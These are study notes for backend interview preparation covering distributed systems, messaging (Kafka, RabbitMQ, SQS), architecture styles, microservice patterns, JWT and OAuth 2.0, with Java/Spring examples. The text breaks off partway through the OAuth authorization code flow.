# Distributed Systems & Microservices — Phase 3 Notes

> **Days 15–21 | Audience:** Backend developers with 1–6 years of experience  
> **Purpose:** Interview preparation & deep understanding  
> **Stack context:** Java / Spring Boot / Cloud-native systems

---

## Table of Contents

1. [Day 15 — Distributed Systems Core](#day-15--distributed-systems-core)
2. [Day 16 — Messaging & Async Systems](#day-16--messaging--async-systems)
3. [Day 17 — Architecture Styles](#day-17--architecture-styles)
4. [Day 18 — Microservices Patterns](#day-18--microservices-patterns)
5. [Day 19 — Authentication & Authorization](#day-19--authentication--authorization)
6. [Day 20 — Observability & Reliability](#day-20--observability--reliability)
7. [Day 21 — Security](#day-21--security)
8. [Interview Q&A](#interview-qa)

---

## Day 15 — Distributed Systems Core

> **Theme:** In a distributed system, anything that can fail, will fail. Design around it.

---

### What Is a Distributed System?

> **Definition:** A distributed system is a collection of independent computers that appear to users as a single coherent system. These computers communicate over a network to coordinate work.

**Why distributed systems are hard:**
- Networks are unreliable — packets get lost, delayed, or duplicated
- Clocks are not perfectly synchronized across nodes
- Nodes can fail independently without others knowing immediately
- There is no global state — every node has a partial view

**Fallacies of Distributed Computing** (things engineers wrongly assume):
1. The network is reliable
2. Latency is zero
3. Bandwidth is infinite
4. The network is secure
5. Topology doesn't change
6. There is one administrator
7. Transport cost is zero
8. The network is homogeneous

---

### Leader–Follower Replication

> **Definition:** A replication model where one node (the **leader** / primary) handles all write operations. The leader replicates changes to one or more **follower** (replica) nodes, which serve read requests.

#### How It Works

```
                   ┌─────────────┐
   Write ──────▶   │   LEADER    │
                   │  (Primary)  │
                   └──────┬──────┘
                          │ replication (sync or async)
              ┌───────────┼───────────┐
              ▼           ▼           ▼
         ┌────────┐  ┌────────┐  ┌────────┐
Read ──▶ │Follower│  │Follower│  │Follower│
         │   1    │  │   2    │  │   3    │
         └────────┘  └────────┘  └────────┘
```

#### Synchronous vs Asynchronous Replication

| Type | How it works | Pros | Cons |
|---|---|---|---|
| **Synchronous** | Leader waits for follower to confirm write before acknowledging client | No data loss; strong consistency | Higher write latency; blocked if follower is slow |
| **Asynchronous** | Leader acknowledges client immediately; follower catches up later | Low write latency; follower lag acceptable | Potential data loss if leader crashes before replication |
| **Semi-synchronous** | At least one follower must confirm; rest are async | Balance of safety and performance | Complexity |

#### Failover — What Happens When the Leader Dies?

1. Followers detect leader failure (heartbeat timeout)
2. An election process picks a new leader (usually the most up-to-date follower)
3. Clients are redirected to the new leader
4. Old leader (if it comes back) must become a follower

**Split-brain problem:** Two nodes both believe they are the leader simultaneously — can cause data corruption. Solved with:
- Fencing tokens (only the node with the latest token can write)
- STONITH (Shoot The Other Node In The Head) — forcibly shut down the old leader

#### Real-World Examples

| System | Implementation |
|---|---|
| PostgreSQL | Streaming replication — leader + standby followers |
| MySQL | Binary log replication |
| Redis Sentinel | Automatic failover with Sentinel monitors |
| MongoDB | Replica Sets (primary + secondaries) |
| Kafka | Partition leaders + ISR (In-Sync Replicas) |

---

### Replication Strategies

> **Definition:** Replication is the process of maintaining copies of data on multiple nodes to improve availability, fault tolerance, and read performance.

#### 1. Single-Leader Replication (Leader-Follower)
Already covered above. One writer, multiple readers.

#### 2. Multi-Leader Replication

Multiple nodes accept writes simultaneously. Changes are replicated to all other leaders.

```
Leader A (Region US) ◀──────▶ Leader B (Region EU)
     ▲                               ▲
     │                               │
  Writes from US users         Writes from EU users
```

**Use case:** Multi-region active-active setups (Google Docs, CouchDB)

**Problem:** **Write conflicts** — two leaders accept different writes to the same record simultaneously.

**Conflict resolution strategies:**
- **Last Write Wins (LWW):** Use timestamps — most recent write survives. Risk: clock skew can cause data loss.
- **Merge:** Combine both writes (works for counters, sets)
- **Custom logic:** Application defines how to merge conflicting changes
- **CRDT (Conflict-free Replicated Data Types):** Data structures designed to merge automatically without conflicts

#### 3. Leaderless Replication (Dynamo-style)

No single leader. Any node accepts writes. Reads and writes go to multiple nodes simultaneously.

```
Client ──▶ Node A (write)
       ──▶ Node B (write)
       ──▶ Node C (write)
```

Used by: Cassandra, DynamoDB, Riak

This is where **Quorum** comes in.

---

### Quorum Reads and Writes

> **Definition:** A quorum is the minimum number of nodes that must agree on a read or write operation for it to be considered successful. It ensures consistency in a leaderless or multi-leader distributed system.

#### The Formula

```
N = Total number of replica nodes
W = Write quorum (nodes that must confirm a write)
R = Read quorum (nodes that must respond to a read)

For strong consistency: W + R > N
```

#### Example with N = 3

```
W=2, R=2  → W + R = 4 > 3  ✅ Strong consistency guaranteed
W=1, R=3  → W + R = 4 > 3  ✅ Strong consistency (every reader sees it)
W=3, R=1  → W + R = 4 > 3  ✅ Strong consistency (every writer confirms)
W=1, R=1  → W + R = 2 ≤ 3  ❌ Eventual consistency only
```

#### Visual — How Quorum Prevents Stale Reads

```
Write (W=2):  Node A ✅  Node B ✅  Node C ❌ (slow)
              At least 2 confirmed the write

Read  (R=2):  Read from Node A ✅  Node B ✅
              Both have the new value → client gets correct data ✅

              Even if we had read from B + C:
              B has new value, C has old → return newest ✅
```

#### Quorum Trade-offs

| Config | Write Speed | Read Speed | Consistency |
|---|---|---|---|
| W=N, R=1 | Slowest (all must confirm) | Fastest | Strong |
| W=1, R=N | Fastest | Slowest | Strong |
| W=majority, R=majority | Balanced | Balanced | Strong |
| W=1, R=1 | Fastest | Fastest | Eventual |

**Cassandra quorum levels:**
```
ONE       → fastest, least consistent (read/write to 1 node)
QUORUM    → majority of nodes → balanced consistency
ALL       → all nodes must respond → slowest, strongest
LOCAL_QUORUM → quorum within local datacenter
```

---

### Network Partitions

> **Definition:** A network partition occurs when a network failure causes a distributed system to split into two or more groups of nodes that cannot communicate with each other, even though each group is still internally functional.

#### Visualizing a Partition

```
Before partition:
Node A ──── Node B ──── Node C
(all connected, communicating normally)

After partition:
Node A  |  Node B ──── Node C
        |
      NETWORK FAILURE (partition)
```

Node A cannot reach B or C. B and C cannot reach A. But A is still running, and B+C are still running.

#### What Happens During a Partition?

**Option 1: Choose Consistency (CP system)**
- Nodes on the minority side stop serving requests
- Return errors until partition heals
- No stale data served
- Example: ZooKeeper — if a ZooKeeper node loses quorum, it stops serving

**Option 2: Choose Availability (AP system)**
- All nodes continue serving requests
- Minority side may serve stale data
- System reconciles after partition heals
- Example: Cassandra — continues accepting writes on all sides; resolves conflicts on reconnection

#### Partition Healing and Reconciliation

When the partition heals, nodes must reconcile diverged state:
- **Read Repair:** On a read request, fix stale replicas in the background
- **Anti-Entropy:** Background process continuously compares and syncs replicas (Merkle trees used to detect differences efficiently)
- **Hinted Handoff:** If a target node is down, temporarily store the write on another node and deliver it when the target recovers

---

### Distributed Consensus

> **Definition:** Distributed consensus is the process by which multiple nodes in a distributed system agree on a single value or decision, even in the presence of failures.

Used for: Leader election, distributed locks, configuration management, commit protocols.

#### Raft Consensus Algorithm (Simplified)

Raft is the most widely understood consensus algorithm (easier to understand than Paxos).

**Roles:**
- **Leader:** Handles all client requests; replicates entries to followers
- **Follower:** Passive; responds to Leader
- **Candidate:** Temporary role during leader election

**Leader Election:**
```
1. Follower times out (no heartbeat from leader)
2. Becomes Candidate; increments term number
3. Sends RequestVote to all nodes
4. If majority votes → becomes Leader
5. Sends heartbeats to maintain leadership
```

**Log Replication:**
```
1. Client sends write to Leader
2. Leader appends to its log (uncommitted)
3. Leader sends AppendEntries to all Followers
4. Once majority acknowledge → Leader commits
5. Leader notifies Followers to commit
6. Leader responds to client
```

**Used by:** etcd (Kubernetes config store), CockroachDB, Consul, TiKV

---

## Day 16 — Messaging & Async Systems

> **Theme:** Don't make your caller wait for work they don't need the result of right now.

---

### Why Async Messaging?

**Problem with synchronous calls:**
```
User places order
    → Order Service calls Payment Service (sync)
    → Payment Service calls Inventory Service (sync)
    → Inventory Service calls Notification Service (sync)
    → User waits 2000ms total

If any service is slow or down → entire chain fails
```

**With async messaging:**
```
User places order
    → Order Service publishes event to queue (10ms)
    → User gets response immediately ✅

In background (async):
    Payment Service processes event
    Inventory Service processes event
    Notification Service processes event
    Each independently, each with retries
```

**Benefits of async messaging:**
- **Decoupling:** Producer doesn't know or care about consumers
- **Resilience:** Consumer can be down; messages queue up and process when it recovers
- **Scalability:** Add more consumers to process faster
- **Peak shaving:** Buffer traffic spikes; process at steady rate

---

### Apache Kafka ⭐

> **Definition:** Apache Kafka is a distributed, fault-tolerant, high-throughput event streaming platform. It stores events as an immutable, ordered log and allows multiple consumers to read from it independently.

#### Core Concepts

| Concept | Definition |
|---|---|
| **Topic** | A named log of events. Like a table in a DB but append-only. |
| **Partition** | A topic is split into partitions for parallelism. Each partition is an ordered, immutable sequence. |
| **Producer** | Application that publishes events to a topic. |
| **Consumer** | Application that reads events from a topic. |
| **Consumer Group** | A set of consumers sharing the load of a topic. Each partition is consumed by one consumer in the group. |
| **Broker** | A Kafka server node that stores partitions. |
| **Offset** | The position of a message within a partition. Consumers track their offset. |
| **Retention** | How long Kafka keeps messages (default: 7 days). Unlike queues, messages are NOT deleted after consumption. |

#### Kafka Architecture

```
                    Topic: "orders"  (3 partitions)
Producer ──────▶  ┌────────────────────────────┐
                  │  Partition 0: [m1, m3, m6]  │
                  │  Partition 1: [m2, m5, m7]  │
                  │  Partition 2: [m4, m8, m9]  │
                  └────────────────────────────┘
                              │
              ┌───────────────┼───────────────┐
              ▼               ▼               ▼
       Consumer A       Consumer B       Consumer C
     (Partition 0)    (Partition 1)    (Partition 2)
     (Consumer Group: "payment-service")
```

**Partition key:** Determines which partition a message goes to. Same key → same partition → guaranteed ordering for that key.

```java
// Producer with key — all events for order-123 go to same partition
producer.send(new ProducerRecord<>("orders", "order-123", orderEvent));
```

#### Kafka vs Traditional Queue

| Feature | Kafka | Traditional Queue (RabbitMQ/SQS) |
|---|---|---|
| Message deletion | After retention period | After acknowledgment |
| Multiple consumers | ✅ All consumer groups read independently | ❌ Message consumed once |
| Message ordering | Per-partition ordering | Per-queue (limited) |
| Replay | ✅ Reset offset and replay | ❌ Cannot replay consumed messages |
| Throughput | Millions/sec | Thousands/sec |
| Use case | Event streaming, audit logs, event sourcing | Task queues, work distribution |

#### Kafka Delivery Guarantees

| Guarantee | Meaning | Config |
|---|---|---|
| **At most once** | Messages may be lost; never duplicated | `acks=0`, no retry |
| **At least once** | Messages never lost; may be duplicated | `acks=all`, retry enabled |
| **Exactly once** | No loss, no duplication | Idempotent producer + transactions |

```java
// At-least-once consumer (most common — handle duplicates in your logic)
@KafkaListener(topics = "orders", groupId = "payment-service")
public void handleOrder(OrderEvent event) {
    if (alreadyProcessed(event.getId())) return; // idempotency check
    processPayment(event);
    markProcessed(event.getId());
}
```

#### Kafka Use Cases
- Event sourcing and audit logs (immutable history)
- Real-time analytics pipelines
- Microservice event-driven communication
- Change Data Capture (CDC) from databases
- Log aggregation across services

---

### RabbitMQ

> **Definition:** RabbitMQ is a traditional message broker that implements the AMQP protocol. It routes messages through **exchanges** to **queues** based on routing rules, and messages are consumed and deleted once acknowledged.

#### Core Concepts

| Concept | Definition |
|---|---|
| **Exchange** | Receives messages from producers and routes them to queues based on rules |
| **Queue** | Stores messages until consumed. Messages are deleted after acknowledgment. |
| **Binding** | Rule connecting an exchange to a queue |
| **Routing Key** | Label on a message used for routing decisions |

#### Exchange Types

| Type | Routing Logic | Use Case |
|---|---|---|
| **Direct** | Route by exact routing key match | Task assignment to specific workers |
| **Fanout** | Broadcast to all bound queues | Notifications to all subscribers |
| **Topic** | Route by pattern (`user.*`, `*.error`) | Flexible multi-consumer routing |
| **Headers** | Route by message header attributes | Complex routing without routing keys |

```
Producer → [Exchange: orders.direct]
               │ routing_key = "payment"
               ▼
         [Queue: payment-queue] → Payment Consumer

               │ routing_key = "inventory"
               ▼
         [Queue: inventory-queue] → Inventory Consumer
```

#### RabbitMQ vs Kafka

| Feature | RabbitMQ | Kafka |
|---|---|---|
| Message model | Queue (consumed and deleted) | Log (retained, replayable) |
| Routing | Flexible exchange-based routing | Partition-based |
| Ordering | Per-queue | Per-partition |
| Replay | ❌ | ✅ |
| Throughput | High (100K/sec) | Very high (millions/sec) |
| Best for | Task queues, RPC, complex routing | Event streaming, high throughput |

---

### Amazon SQS (Simple Queue Service)

> **Definition:** SQS is AWS's fully managed message queuing service. No servers to manage, auto-scales, and integrates natively with AWS services.

#### Two Queue Types

| Type | Behavior | Use Case |
|---|---|---|
| **Standard** | At-least-once delivery; best-effort ordering; very high throughput | Most use cases; tolerate duplicates |
| **FIFO** | Exactly-once delivery; strict ordering; 3,000 msg/sec | Financial transactions, order processing |

#### Key SQS Concepts

**Visibility Timeout:** After a consumer receives a message, it becomes invisible to other consumers for a set period. If not deleted within that time (consumer crashed), it becomes visible again for reprocessing.

```
SQS Queue
│
▼
Consumer A receives message M1
→ M1 becomes invisible (30 sec timeout)
→ Consumer A processes M1 (takes 10 sec)
→ Consumer A deletes M1 ✅

OR (if Consumer A crashes):
→ 30 sec passes
→ M1 becomes visible again
→ Consumer B picks it up ✅
```

**Long Polling:** Instead of repeatedly checking ("is there a message?"), the consumer waits up to 20 seconds for a message. Reduces empty responses and costs.

---

### Pub-Sub Pattern

> **Definition:** Publish-Subscribe is a messaging pattern where **publishers** emit events to a **topic** without knowing who will receive them. **Subscribers** register interest in a topic and receive all matching events. Publishers and subscribers are completely decoupled.

#### Pub-Sub vs Queue (Point-to-Point)

```
Queue (Point-to-Point):
Producer → [Queue] → ONE consumer gets each message
                     (work distribution / load sharing)

Pub-Sub:
Publisher → [Topic] → ALL subscribers get each message
                      (event notification / fan-out)
```

#### Pub-Sub Example — Order Placed Event

```
Order Service publishes:
    Topic: "order.placed"
    Event: { orderId: "123", userId: "456", amount: 1500 }

Subscribers (all receive independently):
    Payment Service      → charge the customer
    Inventory Service    → reserve stock
    Notification Service → send confirmation email
    Analytics Service    → record for reporting
```

**Adding a new subscriber:** Register it with the topic — no change to Order Service.

---

### Dead Letter Queue (DLQ)

> **Definition:** A Dead Letter Queue is a special queue where messages are automatically moved when they cannot be successfully processed — after exceeding retry limits, expiring, or being explicitly rejected. It prevents bad messages from blocking the main queue and provides a place to investigate failures.

#### Why DLQ Exists

```
Main Queue → Consumer → ❌ Processing fails (exception)
                       → Retry 1: ❌ fails again
                       → Retry 2: ❌ fails again
                       → Retry 3: ❌ fails again
                       → Message moved to DLQ ✅

Without DLQ: message retries forever, blocking the queue
With DLQ:    bad message isolated; queue keeps flowing
```

#### DLQ Workflow

```
┌─────────────────┐    3 retries failed    ┌─────────────────┐
│   Main Queue    │  ─────────────────────▶ │   Dead Letter   │
│  order-events   │                         │     Queue       │
└─────────────────┘                         └────────┬────────┘
                                                     │
                                              ┌──────▼──────┐
                                              │  Alert +     │
                                              │  Dashboard   │
                                              │  Manual fix  │
                                              └─────────────┘
```

**DLQ in AWS SQS:**
```json
{
  "RedrivePolicy": {
    "deadLetterTargetArn": "arn:aws:sqs:us-east-1:123:order-events-dlq",
    "maxReceiveCount": 3
  }
}
```

**DLQ best practices:**
- Set alerts on DLQ message count (CloudWatch alarm, PagerDuty)
- Analyze DLQ messages to find root cause
- Build a redrive mechanism to replay fixed messages back to main queue
- Never ignore DLQ growth — it signals a processing bug or data issue

---

## Day 17 — Architecture Styles

> **Theme:** Choose your architecture based on team size, product maturity, and operational capability — not hype.

---

### Monolith

> **Definition:** A monolithic architecture is one where all components of an application — UI, business logic, data access — are built, deployed, and scaled as a single unit.

#### Structure

```
┌──────────────────────────────────────────┐
│              Monolith Application         │
│                                           │
│  ┌──────────┐  ┌──────────┐  ┌────────┐  │
│  │   User   │  │  Order   │  │Payment │  │
│  │ Module   │  │  Module  │  │ Module │  │
│  └──────────┘  └──────────┘  └────────┘  │
│                                           │
│         Single Database                   │
└──────────────────────────────────────────┘
           │
    One deployable artifact (JAR/WAR)
```

#### Pros and Cons

| Pros | Cons |
|---|---|
| Simple to develop initially | Deployment risk — one change deploys everything |
| Easy to test end-to-end | Cannot scale individual components |
| No network latency between modules | Codebase grows into a "big ball of mud" |
| Single deployment | Long build and test cycles |
| Easier debugging | Technology lock-in — one stack for all |

**When to use:** Early-stage product, small team (< 10 engineers), MVP, when operational complexity of microservices would slow you down.

---

### Modular Monolith

> **Definition:** A modular monolith is a single deployable application internally organized into well-defined, loosely coupled modules with clear boundaries and explicit interfaces between them — but without the network overhead of microservices.

#### Structure

```
┌─────────────────────────────────────────────────────┐
│                  Modular Monolith                    │
│                                                      │
│  ┌─────────────────┐    ┌─────────────────┐          │
│  │   User Module   │    │  Order Module   │          │
│  │  (own package)  │───▶│  (own package)  │          │
│  │  UserService    │    │  OrderService   │          │
│  │  UserRepo       │    │  OrderRepo      │          │
│  └─────────────────┘    └────────┬────────┘          │
│                                  │                   │
│                         ┌────────▼────────┐          │
│                         │ Payment Module  │          │
│                         └─────────────────┘          │
│                                                      │
│  Modules communicate via interfaces, NOT direct class │
│  instantiation. Could be separate schemas in one DB. │
└─────────────────────────────────────────────────────┘
```

**Key rule:** Modules must not access each other's internals. They communicate through public interfaces only.

**Why it matters:** A well-designed modular monolith can be extracted into microservices later with much less pain. It's the ideal middle ground for growing teams.

**Example (Java/Spring):**
```
com.company.user      → UserModule (owns User domain)
com.company.order     → OrderModule (owns Order domain)
com.company.payment   → PaymentModule (owns Payment domain)

// Cross-module call — only through interface, never through repo
OrderService calls userService.getUserById(userId)  ✅
OrderService calls userRepository.findById(userId)  ❌ (breaks boundary)
```

---

### Microservices

> **Definition:** A microservices architecture structures an application as a collection of small, independently deployable services, each owning its own data, responsible for a specific business capability, and communicating over a network (typically HTTP or messaging).

#### Structure

```
                        API Gateway
                             │
          ┌──────────────────┼──────────────────┐
          ▼                  ▼                  ▼
   ┌─────────────┐   ┌─────────────┐   ┌─────────────┐
   │    User     │   │    Order    │   │   Payment   │
   │   Service   │   │   Service   │   │   Service   │
   │  [Own DB]   │   │  [Own DB]   │   │  [Own DB]   │
   └─────────────┘   └─────────────┘   └─────────────┘
          │                  │                  │
        MySQL            PostgreSQL          MongoDB
```

#### Pros and Cons

| Pros | Cons |
|---|---|
| Independent deployment of each service | Network latency between services |
| Independent scaling per service | Distributed systems complexity |
| Technology heterogeneity (polyglot) | Harder to test end-to-end |
| Fault isolation | Operational overhead (monitoring, tracing) |
| Team autonomy (Conway's Law) | Data consistency is harder (no ACID across services) |

**When to use:** Product is mature and stable, team is large (10+ engineers per domain), you have DevOps capability to manage deployments, you've already built and learned from a monolith.

> **Conway's Law:** "Organizations design systems that mirror their communication structure." Microservices work best when team boundaries match service boundaries.

#### The Microservices Tax

Microservices are NOT free. You pay for:
- Service discovery infrastructure
- Distributed tracing setup
- API gateway
- Per-service CI/CD pipelines
- Container orchestration (Kubernetes)
- Distributed transaction handling
- Network monitoring and alerting

> **Interview wisdom:** "Microservices solve organizational problems as much as technical ones. Don't adopt them until your monolith is actually hurting you."

---

### Serverless

> **Definition:** Serverless is an execution model where the cloud provider manages server infrastructure entirely. Developers deploy functions (FaaS — Function as a Service) that are triggered by events and scale to zero when idle. You pay only for actual execution time.

#### How It Works

```
Event Source               Cloud Provider          Your Code
─────────────────────────────────────────────────────────────
HTTP Request  ──────▶  [Trigger & Scale]  ──────▶  Function
S3 file upload ─────▶  [Provision server]          executes
Queue message ──────▶  [Run function]              (ms to sec)
Scheduled cron ─────▶  [Tear down after]  ◀──────  Response
```

**Examples:** AWS Lambda, Google Cloud Functions, Azure Functions

#### Pros and Cons

| Pros | Cons |
|---|---|
| No server management | Cold start latency (first invocation is slow) |
| Auto-scales to zero | Max execution time limits (15 min on Lambda) |
| Pay per execution | Hard to run long-running processes |
| Rapid deployment | Vendor lock-in |
| Event-driven by nature | Debugging and tracing are harder |

**Use cases:**
- Image processing on upload
- Scheduled jobs (cron replacements)
- Webhook handlers
- API backends with unpredictable traffic
- Event-driven data pipelines

**Cold Start:** When a function hasn't been called recently, the provider must spin up a container (~100ms–2s delay). Mitigate with: provisioned concurrency, keeping functions warm, or minimizing dependencies.

---

### Architecture Comparison

| Dimension | Monolith | Modular Monolith | Microservices | Serverless |
|---|---|---|---|---|
| Deployment | Single unit | Single unit | Per service | Per function |
| Scaling | All or nothing | All or nothing | Per service | Automatic |
| Complexity | Low | Medium | High | Medium-High |
| Team size | Small | Small-Medium | Large | Any |
| Operational overhead | Low | Low | Very High | Low |
| Best for | MVPs, startups | Growing teams | Large orgs | Event-driven tasks |

---

## Day 18 — Microservices Patterns

> **Theme:** Microservices introduce new problems. These patterns solve them.

---

### API Gateway

> **Definition:** An API Gateway is a server that acts as the single entry point for all client requests to a microservices system. It handles cross-cutting concerns like authentication, rate limiting, routing, and SSL termination, then routes requests to the appropriate downstream services.

#### What an API Gateway Does

```
Client (mobile/web/third-party)
            │
            ▼
    ┌───────────────────────────────────┐
    │           API GATEWAY              │
    │                                   │
    │  ✅ Authentication / Authorization │
    │  ✅ Rate Limiting                  │
    │  ✅ SSL Termination                │
    │  ✅ Request Routing                │
    │  ✅ Load Balancing                 │
    │  ✅ Request / Response Transform   │
    │  ✅ Logging & Monitoring           │
    │  ✅ Caching                        │
    └────────────────┬──────────────────┘
                     │
        ┌────────────┼────────────┐
        ▼            ▼            ▼
   User Service  Order Service  Payment Service
```

**Without API Gateway:** Each service must implement auth, rate limiting, SSL, and logging separately. Duplication, inconsistency, and security gaps.

**Popular API Gateways:** AWS API Gateway, Kong, Nginx, Traefik, Spring Cloud Gateway

#### Backend for Frontend (BFF) Pattern

A variant where each client type gets its own dedicated API Gateway tailored to its needs:

```
Mobile App  ──▶  Mobile BFF  ──▶  microservices
Web App     ──▶  Web BFF     ──▶  microservices
Partner API ──▶  Partner BFF ──▶  microservices
```

Mobile BFF: Returns compact payloads; handles poor connectivity  
Web BFF: Returns richer data; can aggregate multiple services  
Partner BFF: Returns stable versioned API; strict rate limits

---

### Service Discovery

> **Definition:** Service Discovery is the mechanism by which microservices find and communicate with each other dynamically, without hardcoded IP addresses or hostnames — because in dynamic environments (cloud, containers), service instances start and stop constantly.

#### The Problem

```
OrderService wants to call PaymentService.
In a dynamic cloud environment:
  PaymentService may have 3 instances running
  Their IPs change when containers restart
  New instances spin up under load
  Crashed instances are removed

You cannot hardcode IPs. ❌
```

#### Client-Side Discovery

The client queries the **Service Registry** itself and picks an instance to call.

```
OrderService
    │
    ▼ (1) "Where is PaymentService?"
Service Registry (Eureka, Consul)
    │
    ▼ (2) Returns: [10.0.1.5:8080, 10.0.1.6:8080, 10.0.1.7:8080]
    │
OrderService picks one (load balancing)
    │
    ▼ (3) Calls 10.0.1.6:8080/payment
```

**Spring Boot example:**
```java
// Service registers itself on startup
@SpringBootApplication
@EnableEurekaClient  // registers with Eureka
public class PaymentServiceApplication {}

// Client discovers and calls
@Autowired
private DiscoveryClient discoveryClient;

List<ServiceInstance> instances = discoveryClient.getInstances("payment-service");
ServiceInstance instance = instances.get(0);
String url = instance.getUri() + "/payment";
restTemplate.postForObject(url, request, PaymentResponse.class);
```

#### Server-Side Discovery

The client calls a load balancer; the load balancer queries the registry and routes the call.

```
OrderService ──▶ Load Balancer ──▶ PaymentService instance
                      │
                      ▼ (queries)
               Service Registry
```

Examples: AWS ALB + ECS, Kubernetes Services (built-in DNS-based discovery)

#### Service Registry

A database of available service instances. Services register on startup and deregister (or timeout) on shutdown.

**Health checks:** The registry periodically pings registered services. Failed health checks → service removed from registry.

| Tool | Type | Notes |
|---|---|---|
| **Eureka** (Netflix) | Client-side | Spring Cloud native; AP system |
| **Consul** | Both | Health checks, KV store, service mesh |
| **Zookeeper** | Server-side | CP system; Kafka uses it for coordination |
| **Kubernetes DNS** | Server-side | Built into K8s; `service-name.namespace.svc` |

---

### Database per Service

> **Definition:** The database-per-service pattern mandates that each microservice owns its own database (or at minimum its own schema), and no other service can access it directly. Cross-service data access must go through the service's API.

#### Why This Matters

```
❌ Shared Database (anti-pattern):
   User Service   ──▶ ┌──────────┐
   Order Service  ──▶ │  Shared  │
   Payment Service──▶ │    DB    │
                      └──────────┘
   → Schema changes affect all services
   → Services are coupled at the data layer
   → Cannot deploy independently

✅ Database per Service:
   User Service    ──▶ [User DB - MySQL]
   Order Service   ──▶ [Order DB - PostgreSQL]
   Payment Service ──▶ [Payment DB - MongoDB]
   → Each service controls its own schema
   → Independent deployment ✅
   → Choose the right DB for the job ✅
```

#### Challenges and Solutions

| Challenge | Solution |
|---|---|
| Joining data across services | API composition — aggregate in the caller or use a read model (CQRS) |
| Distributed transactions | Saga pattern with compensating actions |
| Data duplication | Accept it — denormalize for read performance; keep in sync via events |
| Reporting across services | Separate reporting DB fed by event streams |

**Data access pattern:**
```java
// OrderService needs user's email for notification
// ❌ Wrong: directly query user DB
String email = userDatabase.query("SELECT email FROM users WHERE id = ?", userId);

// ✅ Right: call UserService API
UserDTO user = userServiceClient.getUser(userId);
String email = user.getEmail();
```

---

### Sidecar Pattern

> **Definition:** The Sidecar pattern deploys a helper container alongside the main application container in the same deployment unit (pod in Kubernetes). The sidecar handles cross-cutting concerns on behalf of the main service — the main service doesn't need to know about them.

#### How It Works

```
┌──────────────────────────────────────────┐
│              Pod / Deployment             │
│                                           │
│   ┌──────────────┐    ┌───────────────┐   │
│   │   Main App   │    │   Sidecar     │   │
│   │  (business   │◀──▶│  Container    │   │
│   │   logic)     │    │               │   │
│   └──────────────┘    │  - Logging    │   │
│                        │  - TLS       │   │
│                        │  - Metrics   │   │
│                        │  - Auth proxy│   │
│                        └───────────────┘   │
└──────────────────────────────────────────┘
```

**Common sidecar uses:**
- **Logging:** Collect and forward logs (Fluentd, Logstash)
- **Proxy:** Intercept network traffic (Envoy, Linkerd)
- **Security:** Mutual TLS, certificate rotation
- **Metrics:** Collect and expose Prometheus metrics
- **Configuration:** Dynamic config refresh

**Service Mesh = Sidecar at scale:**
A service mesh (Istio, Linkerd) deploys a sidecar proxy (Envoy) next to every service. This gives you:
- Automatic mutual TLS between all services
- Traffic management and load balancing
- Distributed tracing
- Circuit breaking
- All without changing application code

---

## Day 19 — Authentication & Authorization

> **Theme:** Authentication = who are you? Authorization = what can you do?

---

### Key Definitions

> **Authentication (AuthN):** The process of verifying the identity of a user or system. Answers "Who are you?"

> **Authorization (AuthZ):** The process of determining what an authenticated entity is allowed to do. Answers "What can you do?"

```
User logs in with credentials
    → Authentication: verifies credentials → "You are Alice" ✅

Alice tries to delete a user record
    → Authorization: checks permissions → "Alice is ADMIN? Yes." ✅
    → Authorization: checks permissions → "Alice is USER? No." ❌
```

---

### JWT — JSON Web Token ⭐

> **Definition:** JWT is a compact, self-contained token format for securely transmitting information between parties as a JSON object. The information is digitally signed (and optionally encrypted), so it can be trusted without a database lookup.

#### JWT Structure

A JWT has three parts separated by dots: `Header.Payload.Signature`

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6IkFETUlOIn0.abc123signature
│────────────────────│──────────────────────────────────────────────│────────────────│
       Header                          Payload                        Signature
```

**Header (Base64 encoded):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (Base64 encoded — NOT encrypted by default):**
```json
{
  "sub": "user-123",
  "name": "Alice",
  "role": "ADMIN",
  "iat": 1700000000,
  "exp": 1700003600
}
```

**Signature:**
```
HMACSHA256(
  base64(header) + "." + base64(payload),
  secret_key
)
```

#### JWT Authentication Flow

```
1. Client sends credentials (username/password)
2. Server validates credentials
3. Server creates JWT, signs with secret key
4. Server returns JWT to client
5. Client stores JWT (memory or httpOnly cookie)
6. Client sends JWT in Authorization header for every request
7. Server validates signature (no DB lookup needed) ✅
8. Server extracts claims (user ID, role) from payload

Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

#### JWT Pros and Cons

| Pros | Cons |
|---|---|
| Stateless — no session store needed | Cannot invalidate before expiry |
| Self-contained — claims embedded | Payload is only Base64, not encrypted |
| Works across microservices | Must manage refresh tokens carefully |
| Scales horizontally easily | Long tokens add bandwidth |

#### Access Token vs Refresh Token

```
Access Token:
  - Short-lived (15 min – 1 hour)
  - Sent with every API request
  - If stolen, limited window of abuse

Refresh Token:
  - Long-lived (7–30 days)
  - Stored securely (httpOnly cookie)
  - Used ONLY to get new access tokens
  - Can be invalidated server-side (stored in DB)

Flow:
  Client ──▶ API with Access Token (valid) → response ✅
  Client ──▶ API with Access Token (expired) → 401
  Client ──▶ Auth Server with Refresh Token → new Access Token
  Client ──▶ API with new Access Token → response ✅
```

**Spring Boot JWT Example:**
```java
// Generate token
String token = Jwts.builder()
    .setSubject(userId)
    .claim("role", user.getRole())
    .setIssuedAt(new Date())
    .setExpiration(new Date(System.currentTimeMillis() + 3600000))
    .signWith(secretKey)
    .compact();

// Validate token
Claims claims = Jwts.parserBuilder()
    .setSigningKey(secretKey)
    .build()
    .parseClaimsJws(token)
    .getBody();
String userId = claims.getSubject();
```

---

### OAuth 2.0

> **Definition:** OAuth 2.0 is an authorization framework that allows a third-party application to obtain limited access to a user's resources on another service (resource server), without exposing the user's credentials to the third party.

#### The Problem OAuth Solves

```
Without OAuth:
  "Give us your Gmail password so we can read your contacts"
  → You give your full credentials to a third party ❌ Dangerous

With OAuth:
  "Allow this app to read your contacts only"
  → You authorize limited access; app never sees your password ✅
```

#### OAuth 2.0 Roles

| Role | Description |
|---|---|
| **Resource Owner** | The user who owns the data |
| **Client** | The third-party app requesting access |
| **Authorization Server** | Issues access tokens after user grants consent (Google, GitHub, Auth0) |
| **Resource Server** | API that holds the user's data; validates tokens |

#### Authorization Code Flow (Most Common and Most Secure)

```
1. User clicks "Login with Google" in your app

2. App redirects to Google Authorization Server:
   https://accounts.google.com/oauth/authorize
   ?client_id=your-app-id
   &redirect_uri=https://yourapp.com/callback
   &scope=email+profile
   &response_type=code

3. User logs into Google and grants consent

4. Google redirects back:
   https://yourapp.com/callback?code=AUTH_CODE_XYZ

